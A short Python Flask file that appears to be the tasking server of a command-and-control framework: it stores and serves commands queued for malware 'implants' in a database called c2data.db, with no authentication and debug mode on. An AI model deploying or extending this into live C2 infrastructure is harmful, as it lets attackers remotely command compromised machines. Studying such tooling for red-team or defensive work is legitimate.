from flask import Flask, request
from flask_restful import Api, Resource

import sqlite3


class Tasks(Resource):
    def get(self):
        conn = get_db_connection()
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM tasks WHERE executed IS NOT 1")
        rows = cursor.fetchall()

        tasks = [dict(row) for row in rows]

        conn.close()

        return tasks, 200
    def post(self):
        try:
            data = request.get_json()
            implant_id = data['implant_id']
            command = data['command']

            conn = get_db_connection()
            cursor = conn.cursor()
            cursor.execute("INSERT INTO tasks (implant_id, command) VALUES (?, ?)", (implant_id, command))
            conn.commit()
            conn.close()
            return "Task added successfully!", 201
        except Exception as e:
            return {"Error": str(e)}, 500
            

def get_db_connection():
    conn = sqlite3.connect('c2data.db')
    conn.row_factory = sqlite3.Row
    return conn


app = Flask(__name__)
api = Api(app)


api.add_resource(Tasks, '/tasks', endpoint='tasks')


if __name__ == "__main__":
    app.run(debug=True)